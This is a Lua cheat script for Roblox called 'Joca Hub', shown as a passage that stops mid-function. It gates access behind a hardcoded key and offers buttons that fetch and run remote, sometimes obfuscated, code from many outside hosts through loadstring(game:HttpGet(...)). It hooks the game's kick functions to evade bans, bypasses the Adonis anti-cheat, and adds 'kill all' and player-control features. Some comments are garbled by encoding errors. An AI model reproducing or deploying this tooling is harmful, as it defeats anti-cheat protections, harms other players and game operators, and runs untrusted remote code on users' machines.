-- KEY SYSTEM
local KeySystem = {}

KeySystem.CorrectKey = "pedroespirrento"
KeySystem.Authorized = false

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- Automatic whitelist storage
local Whitelist = {}

-- Load existing whitelist from memory
local function loadWhitelist()
    if _G.KeySystemWhitelist then
        Whitelist = _G.KeySystemWhitelist
    end
end

-- Save to whitelist automatically when key is correct
local function addToWhitelist(userId)
    if not table.find(Whitelist, userId) then
        table.insert(Whitelist, userId)
        _G.KeySystemWhitelist = Whitelist
    end
end

-- Check if user is in whitelist
local function isWhitelisted(userId)
    return table.find(Whitelist, userId)
end

-- Load whitelist on start
loadWhitelist()

-- Interface
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeySystemGUI"
ScreenGui.Parent = CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -90)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 1
UIStroke.Color = Color3.fromRGB(100, 150, 255)
UIStroke.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 40)
Header.Position = UDim2.new(0, 0, 0, 0)
Header.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 8)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Text = "KEY SYSTEM"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = Header

-- Input field
local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(0.8, 0, 0, 35)
KeyInput.Position = UDim2.new(0.1, 0, 0.3, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.PlaceholderText = "Enter key"
KeyInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
KeyInput.Text = ""
KeyInput.ClearTextOnFocus = false
KeyInput.Font = Enum.Font.Gotham
KeyInput.TextSize = 14
KeyInput.Parent = MainFrame

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 6)
InputCorner.Parent = KeyInput

-- Submit button
local SubmitButton = Instance.new("TextButton")
SubmitButton.Size = UDim2.new(0.8, 0, 0, 35)
SubmitButton.Position = UDim2.new(0.1, 0, 0.6, 0)
SubmitButton.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.Text = "ACCESS"
SubmitButton.Font = Enum.Font.GothamBold
SubmitButton.TextSize = 14
SubmitButton.Parent = MainFrame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 6)
ButtonCorner.Parent = SubmitButton

-- Status label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(0.8, 0, 0, 20)
StatusLabel.Position = UDim2.new(0.1, 0, 0.85, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 150)
StatusLabel.Text = "Enter key to continue"
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 11
StatusLabel.Parent = MainFrame

-- Key verification function
function KeySystem.VerifyKey(inputKey)
    return inputKey == KeySystem.CorrectKey
end

-- Get whitelisted IDs
function KeySystem.GetWhitelistedIDs()
    return Whitelist
end

-- Check if specific user is whitelisted
function KeySystem.IsUserWhitelisted(userId)
    return isWhitelisted(userId)
end

-- Clear whitelist
function KeySystem.ClearWhitelist()
    Whitelist = {}
    _G.KeySystemWhitelist = Whitelist
end

-- On successful key entry
function KeySystem.OnSuccess()
    KeySystem.Authorized = true
    addToWhitelist(LocalPlayer.UserId)
    ScreenGui:Destroy()
end

-- Connect events
SubmitButton.MouseButton1Click:Connect(function()
    local inputKey = KeyInput.Text
    
    if KeySystem.VerifyKey(inputKey) then
        StatusLabel.Text = "Correct key Access granted"
        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        wait(1)
        KeySystem.OnSuccess()
        loadMainScript() -- ⬅️ IMPORTANTE: Isso vai carregar seu script principal
    else
        StatusLabel.Text = "Incorrect key try again"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end)

KeyInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        SubmitButton.MouseButton1Click:Fire()
    end
end)

-- Hover effects
SubmitButton.MouseEnter:Connect(function()
    SubmitButton.BackgroundColor3 = Color3.fromRGB(90, 150, 255)
end)

SubmitButton.MouseLeave:Connect(function()
    SubmitButton.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
end)

-- Check if user is already whitelisted
if isWhitelisted(LocalPlayer.UserId) then
    KeySystem.Authorized = true
    ScreenGui:Destroy()
    loadMainScript() -- ⬅️ Carrega automaticamente se já estiver na whitelist
else
    MainFrame.Visible = true
end
function loadMainScript()

game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Joca Hub",
	Text = "Loading", 
	Icon = "￰🐟"
})

-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- UI Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Joca Hub", "Ocean")

-- SMALL BUTTON WITH NICE DESIGN AND DRAGGABLE
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.Name = "ToggleGUI"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false -- PREVENTS GUI FROM RESETTING ON DEATH

-- Main frame (SMALL)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 50, 0, 50) -- SMALLER
frame.Position = UDim2.new(0, 15, 0, 15)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Colored border around
local glow = Instance.new("UIStroke")
glow.Color = Color3.fromRGB(100, 100, 255)
glow.Thickness = 2
glow.Transparency = 0.3
glow.Parent = frame

-- Soft shadow
local shadow = Instance.new("ImageLabel")
shadow.Size = UDim2.new(1, 10, 1, 10)
shadow.Position = UDim2.new(0, -5, 0, -5)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://5554237733" -- Soft shadow
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(23,23,277,277)
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.8
shadow.Parent = frame

-- Main button
local button = Instance.new("TextButton")
button.Size = UDim2.new(1, 0, 1, 0)
button.BackgroundTransparency = 1
button.Text = "￰🐟" -- Stylish icon
button.TextColor3 = Color3.fromRGB(255, 255, 150) -- LIGHT YELLOW
button.TextSize = 22
button.Font = Enum.Font.GothamBold
button.Parent = frame

-- Click to toggle GUI
button.MouseButton1Click:Connect(function()
    if Library then
        Library:ToggleUI()
    end
end)

-- Alt shortcut
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
    if not gameProcessedEvent and input.KeyCode == Enum.KeyCode.LeftAlt then
        if Library then
            Library:ToggleUI()
        end
    end
end)

-- NICE HOVER EFFECTS
button.MouseEnter:Connect(function()
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    button.TextSize = 24
    button.TextColor3 = Color3.fromRGB(255, 255, 100) -- Stronger yellow
    glow.Transparency = 0.1
    glow.Color = Color3.fromRGB(150, 150, 255)
    shadow.ImageTransparency = 0.6
end)

button.MouseLeave:Connect(function()
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    button.TextSize = 22
    button.TextColor3 = Color3.fromRGB(255, 255, 150)
    glow.Transparency = 0.3
    glow.Color = Color3.fromRGB(100, 100, 255)
    shadow.ImageTransparency = 0.8
end)

-- Click effect
button.MouseButton1Down:Connect(function()
    frame.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    button.TextSize = 20
    glow.Thickness = 1.5
end)

button.MouseButton1Up:Connect(function()
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    button.TextSize = 24
    glow.Thickness = 2
end)

-- IMPROVED DRAG SYSTEM
local dragging = false
local dragStart = nil
local startPos = nil

-- Start drag (works on entire frame)
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        
        -- Visual effect when holding to drag
        frame.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
        glow.Color = Color3.fromRGB(200, 200, 255)
        button.TextColor3 = Color3.fromRGB(255, 255, 50)
    end
end)

-- Update position during drag
game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- End drag
game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        glow.Color = Color3.fromRGB(100, 100, 255)
        button.TextColor3 = Color3.fromRGB(255, 255, 150)
    end
end)

-- ENSURE GUI DOESN'T DISAPPEAR AFTER DEATH
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Check if GUI still exists after respawn
LocalPlayer.CharacterAdded:Connect(function()
    -- Small delay to ensure everything loaded
    wait(1)
    
    -- If GUI was destroyed, recreate
    if not screenGui or not screenGui.Parent then
        -- Recreate GUI
        local newScreenGui = Instance.new("ScreenGui")
        newScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
        newScreenGui.Name = "ToggleGUI"
        newScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        newScreenGui.ResetOnSpawn = false
        
        -- Recreate all content (you can modularize this into a function if you want)
        local newFrame = Instance.new("Frame")
        newFrame.Size = UDim2.new(0, 50, 0, 50)
        newFrame.Position = frame.Position -- Keep same position
        newFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        newFrame.BorderSizePixel = 0
        newFrame.Parent = newScreenGui
        
        local newCorner = Instance.new("UICorner")
        newCorner.CornerRadius = UDim.new(0, 12)
        newCorner.Parent = newFrame
        
        local newGlow = Instance.new("UIStroke")
        newGlow.Color = Color3.fromRGB(100, 100, 255)
        newGlow.Thickness = 2
        newGlow.Transparency = 0.3
        newGlow.Parent = newFrame
        
        local newShadow = Instance.new("ImageLabel")
        newShadow.Size = UDim2.new(1, 10, 1, 10)
        newShadow.Position = UDim2.new(0, -5, 0, -5)
        newShadow.BackgroundTransparency = 1
        newShadow.Image = "rbxassetid://5554237733"
        newShadow.ScaleType = Enum.ScaleType.Slice
        newShadow.SliceCenter = Rect.new(23,23,277,277)
        newShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
        newShadow.ImageTransparency = 0.8
        newShadow.Parent = newFrame
        
        local newButton = Instance.new("TextButton")
        newButton.Size = UDim2.new(1, 0, 1, 0)
        newButton.BackgroundTransparency = 1
        newButton.Text = "￰ﾟﾐﾠ"
        newButton.TextColor3 = Color3.fromRGB(255, 255, 150)
        newButton.TextSize = 22
        newButton.Font = Enum.Font.GothamBold
        newButton.Parent = newFrame
        
        -- Reconnect events
        newButton.MouseButton1Click:Connect(function()
            if Library then
                Library:ToggleUI()
            end
        end)
        
        -- Update references
        screenGui = newScreenGui
        frame = newFrame
        button = newButton
        glow = newGlow
        shadow = newShadow
        corner = newCorner
        
        -- Reconnect drag and hover events
        ReconnectEvents(newFrame, newButton, newGlow, newShadow)
    end
end)

-- Function to reconnect events (optional, for organization)
function ReconnectEvents(frame, button, glow, shadow)
    -- Hover effects
    button.MouseEnter:Connect(function()
        frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        button.TextSize = 24
        button.TextColor3 = Color3.fromRGB(255, 255, 100)
        glow.Transparency = 0.1
        glow.Color = Color3.fromRGB(150, 150, 255)
        shadow.ImageTransparency = 0.6
    end)

    button.MouseLeave:Connect(function()
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        button.TextSize = 22
        button.TextColor3 = Color3.fromRGB(255, 255, 150)
        glow.Transparency = 0.3
        glow.Color = Color3.fromRGB(100, 100, 255)
        shadow.ImageTransparency = 0.8
    end)

    -- Click effects
    button.MouseButton1Down:Connect(function()
        frame.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
        button.TextSize = 20
        glow.Thickness = 1.5
    end)

    button.MouseButton1Up:Connect(function()
        frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        button.TextSize = 24
        glow.Thickness = 2
    end)

    -- Drag system
    local dragging = false
    local dragStart = nil
    local startPos = nil

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            
            frame.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
            glow.Color = Color3.fromRGB(200, 200, 255)
            button.TextColor3 = Color3.fromRGB(255, 255, 50)
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    game:GetService("UserInputService").InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
            frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
            glow.Color = Color3.fromRGB(100, 100, 255)
            button.TextColor3 = Color3.fromRGB(255, 255, 150)
        end
    end)
end

-- Tabs & Sections
local tabFE = Window:NewTab("FE Scripts")
local sectionFE = tabFE:NewSection("Server Side")

local tabBypass = Window:NewTab("Bypass")
local sectionBypass = tabBypass:NewSection("Bypass")

local tabAdmin = Window:NewTab("Admin Commands")
local sectionAdmin = tabAdmin:NewSection("Admin Commands (Most Popular)")

local tabGames = Window:NewTab("Games Scripts")
local sectionGames = tabGames:NewSection("Games")

local HUBS = Window:NewTab("HUBS")
local sectionHUBS = HUBS:NewSection("HUBS/GUIS")

local FE = Window:NewTab("FE V2")
local FESection = FE:NewSection("FE V2 SCRIPTS")

local SPY = Window:NewTab("Build Your Script")
local spySection = SPY:NewSection("Scripting Tools")

local Animations = Window:NewTab("Animations")
local sectionAnimations = Animations:NewSection("Animations")

local tabClient = Window:NewTab("Client")
local sectionPlayer = tabClient:NewSection("Player Mods")
local sectionESP = tabClient:NewSection("ESP")
local sectionExtras = tabClient:NewSection("Extras")

local Chat = Window:NewTab("Chat Bypass")
local ChatSection = Chat:NewSection("Chat Bypasser")

-- =========================
-- BYPASS
-- =========================

sectionBypass:NewButton("Anti Kick", "Anti Kick", function()
    for a, b in pairs(getgc()) do
    if typeof(b) == 'function' then
        if debug.getinfo(b).name == 'kick' then
            hookfunction(debug.getinfo(b).func, function()
            end)
        end
    end
end

local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ScriptNotification"
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 100)
frame.Position = UDim2.new(0.5, -150, 0.5, -50)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "Bypass successful"
title.Size = UDim2.new(1, 0, 0.6, 0)
title.BackgroundTransparency = 1
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

local dismissButton = Instance.new("TextButton")
dismissButton.Text = "Dismiss"
dismissButton.Size = UDim2.new(0.6, 0, 0.3, 0)
dismissButton.Position = UDim2.new(0.2, 0, 0.7, 0)
dismissButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
dismissButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dismissButton.Font = Enum.Font.SourceSans
dismissButton.TextScaled = true
dismissButton.Parent = frame

dismissButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

while true do
    local targetObject = playerGui:FindFirstChild("movementDisabler")
    
    if targetObject then
        targetObject:Destroy()
    end
    
    wait(1)
end
end)

sectionBypass:NewButton("Adonis Bypass", "Adonis Bypass", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
end)

sectionBypass:NewButton("Anti-Kick Bypass", "Anti-Kick Bypass", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Anti-Kick/main/Anti-Kick.lua"))()
end)

-- Anti Kick / Ban Toggle
local antiKickEnabled = false
local originalOnKick

sectionBypass:NewToggle("Anti Kick / Ban", "Tries to prevent kick or ban (client-side)", function(state)
    antiKickEnabled = state
    if state then
        -- Block OnKick function
        originalOnKick = LocalPlayer.OnKick
        LocalPlayer.OnKick = function()
            -- Try to prevent kick with infinite wait
            wait(9e9)
        end
    else
        -- Restore original OnKick function
        if originalOnKick then
            LocalPlayer.OnKick = originalOnKick
            originalOnKick = nil
        else
            LocalPlayer.OnKick = nil
        end
    end
end)

-- =========================
-- ADMIN COMMANDS
-- =========================

sectionAdmin:NewButton("Nameless Admin", "Nameless Admin", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
end)

sectionAdmin:NewButton("Reviz Admin", "Reviz Admin", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pa1ntex/reviz-admin-v2-script-FE/refs/heads/main/Reviz%20admin%20v2%20FE'))()
end)

sectionAdmin:NewButton("Nameless Admin V2", "Nameless Admin V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
end)

sectionAdmin:NewButton("YunusLo1545 Yield", "YunusLo1545 Yield", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/yunus154524/Infinite-Yield/refs/heads/main/YunusLo1545%20Yield'))()
end)

sectionAdmin:NewButton("Infinite Yield", "Infinite Yield", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

sectionAdmin:NewButton("AK ADMIN(KEY)", "AK ADMIN", function()
    loadstring(game:HttpGet("https://angelical.me/ak.lua"))()
end)

-- =========================
-- GAMES
-- =========================

sectionGames:NewButton("Fencing FE", "Fencing", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/joca-hub-fencing/refs/heads/main/README.md'))()
end)

sectionGames:NewButton("Evade", "Evade", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/marcelosero7-cyber/Algolevade/refs/heads/main/Protected_7986958557519459.lua.txt"))()
end)

sectionGames:NewButton("Blade Ball", "Evade", function()
    task.wait()

local success, ui = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
end)
if not success or not ui then return end

setclipboard("https://discord.gg/KReFc6YVy6")

ui:Notify({
    Title = "Argon Hub X",
    Content = "This script is owned and created by AgentX77 on discord. Join discord (copied to clipboard) for more information.",
    Duration = 10,
    Icon = "info"
})

ui:Notify({
    Title = "Anti-cheat Bypassed ",
    Content = "Anti-cheat has been fully bypassed.\n\nLast Updated: 21 October",
    Duration = 10,
    Icon = "circle-check"
})

task.delay(1.5, function()
    pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Games/Blade%20Ball.lua")))
end)
end)

sectionGames:NewButton("Evade Hallowen", "Evade", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/EvadeEvent"))()
end)

sectionGames:NewButton("Prison Life (best)", "Prison Life", function()
	loadstring(game:HttpGet("https://pastefy.app/GZjxqcaq/raw"))()
end)

sectionGames:NewButton("Prison Life", "Prison Life", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FsWin-Project/FsWin/refs/heads/main/Utility/Server-Utility/Prison%20life%20scripts"))()
end)

sectionGames:NewButton("Spray Paint FE", "spray paint", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/jizkss/joca-spray-paint/refs/heads/main/README.md"))()
end)

sectionGames:NewButton("TSB anti spiral(saitama)", "TSB", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/sparksnaps/Anti-Spiral./refs/heads/main/Lua"))()
end)

sectionGames:NewButton("Fling Things", "Fling Things", function()
	loadstring(game:HttpGet("https://rawscripts.net/raw/be-a-gubby-(BIG-UPDATE!!!)-Kill-all-Use-Item-anywhere-trolling-41039"))()
end)

sectionGames:NewButton("BEST BROOKHAVEN HUB", "BEST BROOKHAVEN HUB", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/toparemos/Source/refs/heads/main/Support/loader.luau"))()
end)

sectionGames:NewButton("Blox Fruits", "Blox Fruits", function()
	local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}
getgenv().BETA_VERSION = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/heads/main/main.luau"))(Settings)
end)

sectionGames:NewButton("99 Nights(GOD MODE)", "99 Nights(GOD MODE)", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBaconHub/DATABASE/refs/heads/main/99%20Nights%20in%20the%20Forest/Infinite%20Health.lua"))()
end)

sectionGames:NewButton("99 Nights(OP)", "99 Nights(OP)", function()
     loadstring(game:HttpGet("https://nazuro.xyz/99nights"))()
end)

sectionGames:NewButton("99 Nights", "99 Nights", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
end)

sectionGames:NewButton("99 Nights(2)", "99 Nights(2)", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/AXS-Main/AXS-Script/refs/heads/main/AXS-HUB/Main/Loader"))()
end)

sectionGames:NewButton("99 Nights Diamond Autofarm", "99 Nights Diamond Autofarm", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/Farm%20Diamond%20v2.lua"))()
end)

sectionGames:NewButton("Talentless Auto Piano V2", "Talentless Auto Piano V2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/TALENTLESS/main/TALENTLESS", true))()
    end)
end)

sectionGames:NewButton("Grow A Garden", "Grow A Garden", function()
    loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
end)

sectionGames:NewButton("Murder Mystery 2", "Murder Mystery 2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
end)

sectionGames:NewButton("MM2 AutoFarm and More(best)", "Murder Mystery 2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/croxy1337/hub/refs/heads/main/main.lua"))()
end)

sectionGames:NewButton("Ink Game Script", "Ink Game Script", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0785b4b8f41683be513badd57f6a71c0.lua"))()
end)

sectionGames:NewButton("Steal A Brainrot miranda", "Steal A Brainrot", function()
    loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()
end)

sectionGames:NewButton("Steal A Brainrot lennon", "Steal A Brainrot", function()
    loadstring(game:HttpGet("https://pastefy.app/MJw2J4T6/raw"))()
end)

sectionGames:NewButton("Steal A Brainrot autojoiner", "Steal A Brainrot", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c5d82ca56fa4065d62950f71bc65c05b.lua"))()
end)

sectionGames:NewButton("FE Brookhaven SP HUB","BEST", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()
end)

sectionGames:NewButton("Brookhaven Sander XY NEW", "BEST", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/testUIDK/refs/heads/main/panel.lua"))()
end)

sectionGames:NewToggle("FE Brookhaven Aura(Reactor Update)", "FE Brookhaven Aura(Reactor Update)", function(state)
    if state then
        local player = game.Players.LocalPlayer
        local char = player.Character or player.CharacterAdded:Wait()

        for _, lot in ipairs(workspace["001_Lots"]:GetChildren()) do
            local house = lot:FindFirstChild("HousePickedByPlayer")
            if house then
                local model = house:FindFirstChild("HouseModel")
                if model then
                    local comps = model:FindFirstChild("Components")
                    if comps then
                        for _, part in ipairs(comps:GetChildren()) do
                            if part:FindFirstChild("TouchInterest") then
                                firetouchinterest(char.HumanoidRootPart, part, 0)
                                firetouchinterest(char.HumanoidRootPart, part, 1)
                            end
                        end
                    end
                end
            end
        end
    end
end)

-- =========================
-- FE SCRIPTS
-- =========================

sectionFE:NewToggle("Spam Proximity(15 Studs)", "Spam Proximity(15 Studs)", function(state)
    -- Variￃﾡveis GLOBAIS para controle do estado
    if _G.ProximitySpam == nil then
        _G.ProximitySpam = {
            Active = false,
            Connection = nil,
            TriggeredPrompts = {}
        }
    end
    
    local maxDistance = 15
    
    -- Funￃﾧￃﾣo para parar completamente
    local function stopSpam()
        _G.ProximitySpam.Active = false
        
        if _G.ProximitySpam.Connection then
            _G.ProximitySpam.Connection:Disconnect()
            _G.ProximitySpam.Connection = nil
        end
        
        _G.ProximitySpam.TriggeredPrompts = {}
    end
    
    -- Funￃﾧￃﾣo para iniciar
    local function startSpam()
        stopSpam() -- Para garantir que nￃﾣo hￃﾡ instￃﾢncias anteriores
        
        _G.ProximitySpam.Active = true
        _G.ProximitySpam.TriggeredPrompts = {}
        
        
        -- Conexￃﾣo ￃﾺnica e controlada
        _G.ProximitySpam.Connection = game:GetService("RunService").Heartbeat:Connect(function()
            -- Verificaￃﾧￃﾣo PRINCIPAL se ainda estￃﾡ ativo
            if not _G.ProximitySpam.Active then
                stopSpam()
                return
            end
            
            -- Check if player has character
            local Player = Players.LocalPlayer
            if not Player or not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then
                return
            end

            local playerPosition = Player.Character.HumanoidRootPart.Position

            -- Scan all ProximityPrompts in workspace
            for _, object in pairs(game.Workspace:GetDescendants()) do
                -- Verificaￃﾧￃﾣo SECUNDￃﾁRIA em cada iteraￃﾧￃﾣo
                if not _G.ProximitySpam.Active then
                    break
                end
                
                if object:IsA("ProximityPrompt") then
                    -- Skip if already triggered recently
                    if _G.ProximitySpam.TriggeredPrompts[object] then
                        continue
                    end

                    -- Get prompt position
                    local promptPosition
                    if object.Parent and object.Parent:IsA("BasePart") then
                        promptPosition = object.Parent.Position
                    else
                        local rootPart = object.Parent:FindFirstChildWhichIsA("BasePart")
                        if rootPart then
                            promptPosition = rootPart.Position
                        else
                            continue
                        end
                    end

                    -- Calculate distance to player
                    local distance = (promptPosition - playerPosition).Magnitude

                    -- If distance is less than maxDistance
                    if distance <= maxDistance then
                        -- Set trigger speed to 0 for instant activation
                        object.HoldDuration = 0
                        object.ClickablePrompt = true
                        
                        -- Trigger prompt instantly
                        pcall(function()
                            fireproximityprompt(object)
                            -- Mark as triggered
                            _G.ProximitySpam.TriggeredPrompts[object] = true
                            -- Make triggerable again after 3 seconds
                            delay(3, function()
                                _G.ProximitySpam.TriggeredPrompts[object] = nil
                            end)
                        end)
                    end
                end
            end
        end)
    end

    -- Controle principal baseado no estado do toggle
    if state then
        startSpam()
    else
        stopSpam()
    end
end)

sectionFE:NewButton("FE Kill All", "Kills all players", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/Joca-kill-all/refs/heads/main/README.md'))()

end)

sectionFE:NewButton("FE Cool Sonic", "Idk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
end)

sectionFE:NewButton("FE Linked Sword(need hat)", "cool", function()
    DisableFlingHealthBar = false

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Linked%20Sword"))()
end)

sectionFE:NewButton("NPC Control Panel", "Controls all players", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jizkss/Joca-hub/refs/heads/main/main"))()
end)

sectionFE:NewButton("FE Server Admin", "Controls all players", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ONEReverseCard/My-Scripts/main/Netless%20Server%20Admin.md"))()
end)

sectionFE:NewButton("FE Ragdoll(R15)", "Fall", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/joca-hub-ragdoll/refs/heads/main/README.md'))()
end)

sectionFE:NewButton("Telekineses v6", "Controls all players", function()
